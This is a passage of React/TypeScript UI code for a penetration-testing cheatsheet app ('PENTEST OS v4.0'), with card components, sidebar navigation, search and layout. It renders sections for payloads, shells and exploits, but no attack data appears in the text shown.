      <div className={`collapsible ${open ? "open" : "closed"}`}>
        <div style={{ padding: "8px 10px 10px", background: "rgba(0,5,8,.45)", display: "flex", flexDirection: "column", gap: 5 }}>
          {filteredCmds.map((c, i) => <CommandRow key={i} cmd={c} onCopy={onCopy} />)}
        </div>
      </div>
    </div>
  );
});
ToolCard.displayName = "ToolCard";

/* ─────────────────────────────────────────────────────────
   VULN CARD
───────────────────────────────────────────────────────── */
const VulnCard = memo(({ vuln, searchQ, onCopy }: { vuln: Vulnerability; searchQ: string; onCopy: (t: string) => void }): React.ReactElement => {
  const [open, setOpen] = useState<boolean>(true);
  const sev = getSev(vuln.sev);
  return (
    <div style={{ border: `1px solid ${sev.border}`, borderRadius: 10, overflow: "hidden", marginBottom: 10, background: sev.bg, position: "relative" }}>
      <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 1, overflow: "hidden" }}><div className="scan-line-inner" /></div>
      <button onClick={() => setOpen(v => !v)} style={{ width: "100%", display: "flex", alignItems: "flex-start", justifyContent: "space-between", padding: "12px 12px", background: "transparent", border: "none", cursor: "pointer", textAlign: "left", gap: 8 }}>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div className="orbit" style={{ fontSize: 11, fontWeight: 700, color: sev.color }}>{vuln.name}</div>
          {vuln.desc && <div className="mono" style={{ fontSize: 9, color: "rgba(255,255,255,.28)", marginTop: 1 }}>{vuln.desc}</div>}
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>
          <span className="orbit" style={{ fontSize: 8, fontWeight: 700, padding: "2px 7px", borderRadius: 4, background: sev.bg, color: sev.color, border: `1px solid ${sev.border}`, textTransform: "uppercase" as const }}>{(vuln.sev || "low").toUpperCase()}</span>
          <span className="mono" style={{ fontSize: 10, color: "rgba(255,255,255,.28)", display: "inline-block", transform: open ? "rotate(90deg)" : "none", transition: "transform .2s" }}>▶</span>
        </div>
      </button>
      <div className={`collapsible ${open ? "open" : "closed"}`}>
        <div style={{ padding: "10px 11px 13px", background: "rgba(0,5,0,.45)", display: "flex", flexDirection: "column", gap: 10 }}>
          {vuln.payloads?.length ? <div><SecLabel label="PAYLOADS" /><div style={{ display: "flex", flexDirection: "column", gap: 5 }}>{vuln.payloads.map((p, i) => <PayloadRow key={i} item={p} onCopy={onCopy} />)}</div></div> : null}
          {vuln.types?.map((t, i) => <div key={i}><SecLabel label={t.type.toUpperCase()} /><div style={{ display: "flex", flexDirection: "column", gap: 5 }}>{t.payloads.map((p, j) => <PayloadRow key={j} item={p} onCopy={onCopy} />)}</div></div>)}
          {vuln.shells?.length ? <div><SecLabel label="REVERSE SHELLS" />{vuln.shells.map((s, i) => <ShellRow key={i} shell={s} onCopy={onCopy} />)}</div> : null}
          {vuln.exploits?.length ? <div><SecLabel label="EXPLOIT CODE" />{vuln.exploits.map((e, i) => <ExploitCard key={i} exploit={e} onCopy={onCopy} />)}</div> : null}
          {vuln.examples?.length ? <div><SecLabel label="EXAMPLES" />{vuln.examples.map((e, i) => <ExampleCard key={i} ex={e} onCopy={onCopy} />)}</div> : null}
          {vuln.tools?.map((t, i) => <div key={i}><SecLabel label={`TOOL: ${t.name}`} /><ToolCard tool={t} searchQ={searchQ} onCopy={onCopy} /></div>)}
        </div>
      </div>
    </div>
  );
});
VulnCard.displayName = "VulnCard";

/* ─────────────────────────────────────────────────────────
   OWASP CARD
───────────────────────────────────────────────────────── */
const OWASPCard = memo(({ vuln, defaultOpen, onCopy }: { vuln: OWASPVulnerability; defaultOpen: boolean; onCopy: (t: string) => void }): React.ReactElement => {
  const [open, setOpen] = useState<boolean>(defaultOpen);
  const sev = getSev(vuln.sev);
  return (
    <div style={{ border: "1px solid rgba(255,170,0,.15)", borderRadius: 10, overflow: "hidden", marginBottom: 8, background: "rgba(8,5,0,.88)", position: "relative" }}>
      <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 1, overflow: "hidden" }}><div className="scan-line-inner-amber" /></div>
      <button onClick={() => setOpen(v => !v)} className="nav-sweep"
        style={{ width: "100%", display: "flex", alignItems: "center", gap: 10, padding: "11px 12px", background: "transparent", border: "none", cursor: "pointer", textAlign: "left" }}>
        <span className="mono" style={{ fontSize: 18, color: "rgba(255,170,0,.22)", width: 26, flexShrink: 0, lineHeight: 1 }}>{String(vuln.rank).padStart(2, "0")}</span>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div className="orbit" style={{ fontSize: 11, color: "#ffaa00", fontWeight: 700, letterSpacing: ".02em" }}>{vuln.name}</div>
          <div className="mono" style={{ fontSize: 9, color: "rgba(255,170,0,.38)", marginTop: 1 }}>{vuln.desc}</div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>
          <span className="orbit" style={{ fontSize: 8, fontWeight: 700, padding: "2px 7px", borderRadius: 4, background: sev.bg, color: sev.color, border: `1px solid ${sev.border}`, textTransform: "uppercase" as const }}>{(vuln.sev || "").toUpperCase()}</span>
          <span className="mono" style={{ fontSize: 10, color: "rgba(255,255,255,.22)", display: "inline-block", transform: open ? "rotate(90deg)" : "none", transition: "transform .2s" }}>▶</span>
        </div>
      </button>
      <div className={`collapsible ${open ? "open" : "closed"}`}>
        <div style={{ padding: "10px 12px 12px", background: "rgba(0,5,0,.42)", display: "flex", flexDirection: "column", gap: 8 }}>
          {vuln.examples?.length ? <div><SecLabel label="EXAMPLES" />{vuln.examples.map((ex, i) => <div key={i} className="mono" style={{ display: "flex", gap: 6, fontSize: 11, color: "rgba(255,170,0,.58)", padding: "3px 0", lineHeight: 1.5 }}><span style={{ color: "rgba(255,170,0,.3)", flexShrink: 0 }}>▸</span>{ex}</div>)}</div> : null}
          {vuln.types?.length ? <div><SecLabel label="INJECTION TYPES" /><div style={{ display: "flex", flexWrap: "wrap", gap: 5 }}>{vuln.types.map((t, i) => <span key={i} className="mono" style={{ fontSize: 9, padding: "2px 7px", borderRadius: 4, background: "rgba(0,40,10,.5)", color: "rgba(0,200,50,.5)", border: "1px solid rgba(0,200,50,.18)" }}>{t}</span>)}</div></div> : null}
          {vuln.methods?.length ? <div><SecLabel label="TEST METHODS" />{vuln.methods.map((m, i) => <div key={i} className="mono" style={{ display: "flex", gap: 6, fontSize: 11, color: "rgba(255,170,0,.58)", padding: "3px 0", lineHeight: 1.5 }}><span style={{ color: "rgba(255,170,0,.3)", flexShrink: 0 }}>▸</span>{m}</div>)}</div> : null}
          {vuln.payloads?.length ? <div><SecLabel label="PAYLOADS" /><div style={{ display: "flex", flexDirection: "column", gap: 5 }}>{vuln.payloads.map((p, i) => <PayloadRow key={i} item={p} onCopy={onCopy} />)}</div></div> : null}
          {(vuln.tools as string[] | undefined)?.length ? <div><SecLabel label="TOOLS" /><div style={{ display: "flex", flexWrap: "wrap", gap: 5 }}>{(vuln.tools as string[]).map((t, i) => <span key={i} className="mono" style={{ fontSize: 9, padding: "2px 7px", borderRadius: 4, background: "rgba(0,20,50,.5)", color: "rgba(100,170,255,.6)", border: "1px solid rgba(100,170,255,.18)" }}>$ {t}</span>)}</div></div> : null}
          {vuln.covered && <div className="mono" style={{ fontSize: 9, color: "rgba(255,170,0,.3)", fontStyle: "italic" }}>📍 {vuln.covered}</div>}
        </div>
      </div>
    </div>
  );
});
OWASPCard.displayName = "OWASPCard";

/* ─────────────────────────────────────────────────────────
   PORT GRID
───────────────────────────────────────────────────────── */
const PortGrid = memo(({ ports }: { ports: Port[] }): React.ReactElement => (
  <div className="port-grid">
    {ports.map((p, i) => (
      <div key={i} className="port-card" style={{ border: "1px solid rgba(0,255,231,.1)", borderRadius: 9, padding: "10px 12px", background: "rgba(0,8,12,.88)" }}>
        <div className="orbit" style={{ fontSize: 16, color: "var(--cy)", fontWeight: 700, textShadow: "0 0 8px rgba(0,255,231,.28)" }}>:{p.port}</div>
        <div className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.35)", marginBottom: 5 }}>{p.svc}</div>
        {p.vulns.map((v, j) => <div key={j} className="mono" style={{ fontSize: 9, color: "rgba(255,70,70,.58)", display: "flex", gap: 5, lineHeight: 1.5 }}><span style={{ color: "rgba(255,50,50,.32)", flexShrink: 0 }}>•</span>{v}</div>)}
      </div>
    ))}
  </div>
));
PortGrid.displayName = "PortGrid";

/* ─────────────────────────────────────────────────────────
   SHEET CONTENT
───────────────────────────────────────────────────────── */
const SheetContent = memo(({ sheet, searchQ, onCopy }: { sheet: Sheet; searchQ: string; onCopy: (t: string) => void }): React.ReactElement => {
  const q = searchQ.toLowerCase();
  return (
    <div>
      {sheet.subsections?.map((sub, si) => {
        const filteredTools: Tool[] = (sub.tools || []).filter(t => !q || t.name.toLowerCase().includes(q) || t.commands.some(c => c.cmd.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q)));
        if (q && filteredTools.length === 0 && !(sub.vulnerabilities?.length)) return null;
        return (
          <div key={si} style={{ marginBottom: 20 }}>
            <div className="orbit" style={{ fontSize: 10, color: "rgba(0,255,231,.5)", letterSpacing: ".14em", fontWeight: 700, marginBottom: 10, paddingBottom: 7, borderBottom: "1px solid rgba(0,255,231,.1)", display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{ display: "inline-block", width: 3, height: 10, background: "var(--cy)", borderRadius: 1, boxShadow: "0 0 5px var(--cy)" }} />{sub.title}
            </div>
            {filteredTools.map((t, ti) => <ToolCard key={ti} tool={t} searchQ={searchQ} onCopy={onCopy} />)}
            {(sub.vulnerabilities || []).map((v, vi) => <VulnCard key={vi} vuln={v} searchQ={searchQ} onCopy={onCopy} />)}
          </div>
        );
      })}
      {sheet.vulns?.map((v, i) => <VulnCard key={i} vuln={v} searchQ={searchQ} onCopy={onCopy} />)}
      {sheet.owasp && <div>{sheet.owasp.filter(v => !q || v.name.toLowerCase().includes(q) || v.desc.toLowerCase().includes(q)).map((v, i) => <OWASPCard key={i} vuln={v} defaultOpen={i === 0} onCopy={onCopy} />)}</div>}
      {sheet.ports && <PortGrid ports={sheet.ports.filter(p => !q || String(p.port).includes(q) || p.svc.toLowerCase().includes(q) || p.vulns.some(v => v.toLowerCase().includes(q)))} />}
    </div>
  );
});
SheetContent.displayName = "SheetContent";

/* ─────────────────────────────────────────────────────────
   SIDEBAR CONTENTS (shared between drawer & desktop)
───────────────────────────────────────────────────────── */
const SidebarContents = memo(({ activeIdx, total, onSwitch, onClose }: {
  activeIdx: number; total: number; onSwitch: (i: number) => void; onClose?: () => void;
}): React.ReactElement => (
  <>
    {/* Logo */}
    <div style={{ padding: "14px 14px 10px", borderBottom: "1px solid rgba(0,255,231,.08)", flexShrink: 0 }}>
      <div className="orbit" style={{ fontSize: 10, color: "var(--cy)", letterSpacing: ".1em", fontWeight: 700, display: "flex", alignItems: "center", gap: 7 }}>
        <span style={{ width: 7, height: 7, borderRadius: "50%", background: "var(--cy)", boxShadow: "0 0 8px var(--cy)", display: "inline-block", animation: "blink 1.2s step-end infinite" }} />
        PENTEST OS v4.0
      </div>
      <div className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.28)", marginTop: 3, letterSpacing: ".18em" }}>{total} MODULES LOADED</div>
    </div>

    {/* Nav */}
    <nav className="sidebar-nav" style={{ flex: 1, padding: "6px 7px", display: "flex", flexDirection: "column", gap: 1 }}>
      {SHEETS.map((s, idx) => (
        <button key={s.id} onClick={() => { onSwitch(idx); onClose?.(); }} className="nav-btn mono"
          style={{ width: "100%", display: "flex", alignItems: "center", gap: 8, padding: "7px 9px", borderRadius: 7, border: idx === activeIdx ? "1px solid rgba(0,255,231,.2)" : "1px solid transparent", background: idx === activeIdx ? "rgba(0,255,231,.09)" : "transparent", color: idx === activeIdx ? "var(--cy)" : "rgba(0,255,231,.4)", cursor: "pointer", textAlign: "left", fontSize: 11, fontWeight: idx === activeIdx ? 700 : 400, position: "relative" }}>
          {idx === activeIdx && <span style={{ position: "absolute", left: 0, top: 3, bottom: 3, width: 2, borderRadius: 1, background: "var(--cy)", boxShadow: "0 0 6px var(--cy)" }} />}
          <span style={{ fontSize: 13, width: 18, textAlign: "center", flexShrink: 0 }}>{s.icon}</span>
          <span style={{ flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{s.name}</span>
          {idx === activeIdx && <span style={{ width: 5, height: 5, borderRadius: "50%", background: "var(--cy)", flexShrink: 0, boxShadow: "0 0 5px var(--cy)" }} />}
        </button>
      ))}
    </nav>

    {/* Warning */}
    <div style={{ margin: 8, padding: "8px 10px", borderRadius: 8, background: "rgba(80,0,0,.5)", border: "1px solid rgba(200,50,50,.38)", flexShrink: 0 }}>
      <div className="orbit" style={{ fontSize: 9, color: "#ff6666", letterSpacing: ".07em", fontWeight: 700, marginBottom: 2 }}>⚠ AUTHORIZED USE ONLY</div>
      <div className="mono" style={{ fontSize: 9, color: "rgba(255,80,80,.5)", lineHeight: 1.5 }}>For ethical security testing &amp; educational use with written permission only.</div>
    </div>
  </>
));
SidebarContents.displayName = "SidebarContents";

/* ─────────────────────────────────────────────────────────
   MAIN APP
───────────────────────────────────────────────────────── */
export default function PentestCheatsheet(): React.ReactElement {
  const [activeIdx, setActiveIdx]     = useState<number>(0);
  const [searchQ, setSearchQ]         = useState<string>("");
  const [drawerOpen, setDrawerOpen]   = useState<boolean>(false);
  const contentRef                    = useRef<HTMLDivElement>(null);
  const { copy, toastVisible }        = useCopy();

  const active: Sheet  = SHEETS[activeIdx];
  const total: number  = SHEETS.length;
  const pct: number    = Math.round(((activeIdx + 1) / total) * 100);

  const switchSheet = useCallback((idx: number): void => {
    setActiveIdx(idx);
    setSearchQ("");
    if (contentRef.current) contentRef.current.scrollTop = 0;
  }, []);

  const openDrawer  = useCallback((): void => { setDrawerOpen(true);  document.body.classList.add("drawer-open"); }, []);
  const closeDrawer = useCallback((): void => { setDrawerOpen(false); document.body.classList.remove("drawer-open"); }, []);

  const handleSearchChange = useCallback((e: React.ChangeEvent<HTMLInputElement>): void => { setSearchQ(e.target.value); }, []);
  const handleSearchFocus  = useCallback((e: React.FocusEvent<HTMLInputElement>): void  => { e.target.style.borderColor = "rgba(0,255,231,.32)"; }, []);
  const handleSearchBlur   = useCallback((e: React.FocusEvent<HTMLInputElement>): void  => { e.target.style.borderColor = "rgba(0,255,231,.12)"; }, []);

  return (
    <div style={{ display: "flex", height: "100dvh", background: "#000", overflow: "hidden", position: "relative", fontFamily: "'Share Tech Mono', monospace" }}>
      <style dangerouslySetInnerHTML={{ __html: GLOBAL_CSS }} />

      <ParticleField />

      {/* Ambient glows */}
      <div style={{ position: "fixed", top: 0, left: 0, width: 400, height: 400, borderRadius: "50%", background: "radial-gradient(circle,rgba(0,255,231,.03),transparent 65%)", pointerEvents: "none", zIndex: 1 }} />
      <div style={{ position: "fixed", bottom: 0, right: 0, width: 350, height: 350, borderRadius: "50%", background: "radial-gradient(circle,rgba(59,130,246,.03),transparent 65%)", pointerEvents: "none", zIndex: 1 }} />

      {/* Global scan line */}
      <div style={{ position: "fixed", left: 0, right: 0, height: 1, background: "linear-gradient(90deg,transparent,rgba(0,255,231,.12),transparent)", zIndex: 2, animation: "scanY 9s linear infinite" }} />

      <CopyToast visible={toastVisible} />

      {/* ── MOBILE DRAWER OVERLAY ── */}
      <div className={`drawer-overlay${drawerOpen ? " open" : ""}`} onClick={closeDrawer} style={{ touchAction: "none" }} />

      {/* ── MOBILE/TABLET DRAWER (< 900px) ── */}
      <div className={`sidebar-drawer${drawerOpen ? " open" : ""}`}>
        <SidebarContents activeIdx={activeIdx} total={total} onSwitch={switchSheet} onClose={closeDrawer} />
      </div>

      {/* ── DESKTOP SIDEBAR (≥ 900px) ── */}
      <aside className="sidebar-desktop">
        <SidebarContents activeIdx={activeIdx} total={total} onSwitch={switchSheet} />
      </aside>

      {/* ── MAIN AREA ── */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", minWidth: 0, zIndex: 10 }}>

        {/* ── MOBILE TOP BAR (< 640px) ── */}
        <div className="mobile-header" style={{ padding: "10px 12px", background: "rgba(0,6,10,.95)", borderBottom: "1px solid rgba(0,255,231,.1)", flexShrink: 0, display: "flex", alignItems: "center", gap: 10, backdropFilter: "blur(16px)" }}>
          <button className="hamburger" onClick={openDrawer} aria-label="Open menu">
            <span /><span /><span />
          </button>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div className="orbit" style={{ fontSize: 12, color: "var(--cy)", fontWeight: 700, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{active.icon} {active.name}</div>
          </div>
          <span className="orbit" style={{ fontSize: 10, color: "rgba(0,255,231,.5)", flexShrink: 0 }}>{String(activeIdx + 1).padStart(2, "0")}/{String(total).padStart(2, "0")}</span>
        </div>

        {/* ── HEADER ── */}
        <div style={{ padding: "11px 14px 10px", background: "rgba(0,6,10,.92)", borderBottom: "1px solid rgba(0,255,231,.1)", flexShrink: 0, backdropFilter: "blur(16px)", position: "relative", overflow: "hidden" }}>
          <div style={{ position: "absolute", top: 0, left: "-33%", height: 1, width: "33%", background: "linear-gradient(90deg,transparent,rgba(0,255,231,.85),transparent)", animation: "hsweep 4s ease-in-out infinite" }} />

          {/* Title row + nav controls */}
          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 10, marginBottom: 8 }}>
            <div style={{ minWidth: 0, flex: 1 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, flexWrap: "wrap" }}>
                <span style={{ fontSize: 16 }}>{active.icon}</span>
                <div>
                  <div className="orbit neon-text" style={{ fontSize: 14, color: "var(--cy)", fontWeight: 700, letterSpacing: ".02em" }}>{active.name}</div>
                  <div className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.3)", marginTop: 1 }}>{active.desc}</div>
                </div>
              </div>
              <div className="tag-row">
                {active.tags.map(t => <span key={t} className="mono" style={{ fontSize: 9, padding: "2px 6px", borderRadius: 4, background: "rgba(0,255,231,.05)", color: "rgba(0,255,231,.3)", border: "1px solid rgba(0,255,231,.1)" }}>#{t}</span>)}
              </div>
            </div>

            {/* Prev/Next — hidden on smallest screens */}
            <div className="nav-controls" style={{ gap: 5, alignItems: "center", flexShrink: 0 }}>
              <button onClick={() => { if (activeIdx > 0) switchSheet(activeIdx - 1); }} disabled={activeIdx === 0} className="mono"
                style={{ fontSize: 10, padding: "5px 9px", borderRadius: 7, border: "1px solid rgba(0,255,231,.16)", background: "rgba(0,255,231,.04)", color: "var(--cy)", cursor: "pointer", opacity: activeIdx === 0 ? .28 : 1 }}>◀</button>
              <span className="orbit" style={{ fontSize: 10, color: "var(--cy)", padding: "4px 9px", border: "1px solid rgba(0,255,231,.18)", borderRadius: 7 }}>
                {String(activeIdx + 1).padStart(2, "0")}/{String(total).padStart(2, "0")}
              </span>
              <button onClick={() => { if (activeIdx < total - 1) switchSheet(activeIdx + 1); }} disabled={activeIdx === total - 1} className="mono"
                style={{ fontSize: 10, padding: "5px 9px", borderRadius: 7, border: "1px solid rgba(0,255,231,.16)", background: "rgba(0,255,231,.04)", color: "var(--cy)", cursor: "pointer", opacity: activeIdx === total - 1 ? .28 : 1 }}>▶</button>
            </div>
          </div>

          {/* Progress bar */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
            <div style={{ flex: 1, height: 2, borderRadius: 2, background: "rgba(0,255,231,.07)", overflow: "hidden" }}>
              <div style={{ height: "100%", borderRadius: 2, background: "linear-gradient(90deg,rgba(0,255,231,.4),var(--cy))", boxShadow: "0 0 6px rgba(0,255,231,.35)", transition: "width .5s cubic-bezier(.4,0,.2,1)", width: `${pct}%` }} />
            </div>
            <div className="mono" style={{ fontSize: 9, color: "rgba(0,255,231,.28)", whiteSpace: "nowrap" }}>{pct}%</div>
          </div>

          {/* Search */}
          <div style={{ position: "relative" }}>
            <span style={{ position: "absolute", left: 10, top: "50%", transform: "translateY(-50%)", fontSize: 11, color: "rgba(0,255,231,.3)", pointerEvents: "none" }}>⌕</span>
            <input
              type="search"
              placeholder="Search commands, payloads, tools..."
              value={searchQ}
              onChange={handleSearchChange}
              onFocus={handleSearchFocus}
              onBlur={handleSearchBlur}
              className="mono search-input"
              style={{ width: "100%", background: "rgba(0,255,231,.04)", border: "1px solid rgba(0,255,231,.12)", borderRadius: 8, padding: "7px 10px 7px 26px", color: "var(--cy)", outline: "none", transition: "border-color .2s" }}
            />
          </div>
        </div>

        {/* ── CONTENT ── */}
        <div ref={contentRef} className="content-area" style={{ flex: 1, overflowY: "auto", background: "transparent" }}>
          <SheetContent key={activeIdx} sheet={active} searchQ={searchQ} onCopy={copy} />
        </div>

        {/* ── MOBILE BOTTOM NAV (swipe prev/next) ── */}
        <div style={{ display: "flex", borderTop: "1px solid rgba(0,255,231,.08)", background: "rgba(0,6,10,.95)", flexShrink: 0, zIndex: 10 }}
          className="mobile-header">
          <button onClick={() => { if (activeIdx > 0) switchSheet(activeIdx - 1); }} disabled={activeIdx === 0}
            style={{ flex: 1, padding: "10px", background: "transparent", border: "none", borderRight: "1px solid rgba(0,255,231,.08)", color: activeIdx === 0 ? "rgba(0,255,231,.2)" : "var(--cy)", cursor: "pointer", fontSize: 11, fontFamily: "'Share Tech Mono', monospace", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
            ◀ {activeIdx > 0 ? SHEETS[activeIdx - 1].icon : ""}
          </button>
          <button onClick={openDrawer}
            style={{ flex: 2, padding: "10px", background: "transparent", border: "none", borderRight: "1px solid rgba(0,255,231,.08)", color: "rgba(0,255,231,.5)", cursor: "pointer", fontSize: 9, fontFamily: "'Orbitron', sans-serif", letterSpacing: ".08em" }}>
            MENU
          </button>
          <button onClick={() => { if (activeIdx < total - 1) switchSheet(activeIdx + 1); }} disabled={activeIdx === total - 1}
            style={{ flex: 1, padding: "10px", background: "transparent", border: "none", color: activeIdx === total - 1 ? "rgba(0,255,231,.2)" : "var(--cy)", cursor: "pointer", fontSize: 11, fontFamily: "'Share Tech Mono', monospace", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
            {activeIdx < total - 1 ? SHEETS[activeIdx + 1].icon : ""} ▶
          </button>
        </div>
      </div>
    </div>
  );
}